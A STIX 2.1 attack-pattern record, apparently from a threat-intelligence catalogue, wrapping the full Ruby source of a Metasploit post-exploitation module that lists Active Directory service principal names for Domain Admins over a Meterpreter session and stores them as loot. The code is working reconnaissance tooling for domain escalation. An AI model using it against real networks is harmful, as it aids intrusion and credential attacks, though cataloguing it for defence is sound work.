{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--01947bce-67f2-43e2-a2cf-d405d841bbbe",
    "created": "2024-08-14T16:33:05.035832Z",
    "modified": "2024-08-14T16:33:05.035836Z",
    "name": "Windows Gather Active Directory Service Principal Names",
    "description": " This module will enumerate servicePrincipalName in the default AD directory where the user is a member of the Domain Admins group.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ad_service_principal_names.rb",
            "external_id": "enum_ad_service_principal_names.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.netspi.com/blog/entryid/214/faster-domain-escalation-using-ldap"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Active Directory Service Principal Names',\n        'Description' => %q{\n          This module will enumerate servicePrincipalName in the default AD directory\n          where the user is a member of the Domain Admins group.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ben Campbell', # Metasploit Module\n          'Scott Sutherland' # Original Powershell Code\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          ['URL', 'https://www.netspi.com/blog/entryid/214/faster-domain-escalation-using-ldap'],\n        ]\n      )\n    )\n\n    register_options([\n      OptString.new('FILTER', [true, 'Search filter, DOM_REPL will be automatically replaced', '(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DOM_REPL))'])\n    ])\n\n    deregister_options('FIELDS')\n  end\n\n  def run\n    domain ||= datastore['DOMAIN']\n    domain ||= get_domain\n\n    fields = ['cn', 'servicePrincipalName']\n\n    search_filter = datastore['FILTER']\n    max_search = datastore['MAX_SEARCH']\n\n    # This needs checking against LDAP improvements PR.\n    dn = get_default_naming_context(domain)\n\n    if dn.blank?\n      fail_with(Failure::Unknown, 'Unable to retrieve the Default Naming Context')\n    end\n\n    search_filter.gsub!('DOM_REPL', dn)\n\n    begin\n      q = query(search_filter, max_search, fields, domain)\n    rescue RuntimeError => e\n      # Raised when the default naming context isn't specified as distinguished name\n      print_error(e.message)\n      return\n    end\n\n    if q.nil? || q[:results].empty?\n      return\n    end\n\n    fields << 'Service'\n    fields << 'Host'\n\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'Service Principal Names',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => ['cn', 'Service', 'Host']\n    )\n\n    q[:results].each do |result|\n      rows = parse_result(result, fields)\n      next if rows.nil?\n\n      rows.each do |row|\n        results_table << row\n      end\n    end\n\n    print_line results_table.to_s\n    stored_path = store_loot('ad.computers', 'text/plain', session, results_table.to_csv)\n    print_good(\"Results saved to: #{stored_path}\")\n  end\n\n  def parse_result(result, fields)\n    rows = []\n    row = []\n\n    0.upto(fields.length - 1) do |i|\n      field = (result[i][:value].nil? ? '' : result[i][:value])\n\n      if fields[i] == 'servicePrincipalName'\n        break if field.blank?\n\n        spns = field.split(',')\n        spns.each do |spn|\n          new_row = row.dup\n          split = spn.split('/')\n          if split.length == 2\n            new_row << split[0]\n            new_row << split[1]\n            rows << new_row\n          else\n            print_error(\"Invalid SPN: #{field}\")\n          end\n        end\n      else\n        row << field\n      end\n    end\n\n    rows\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}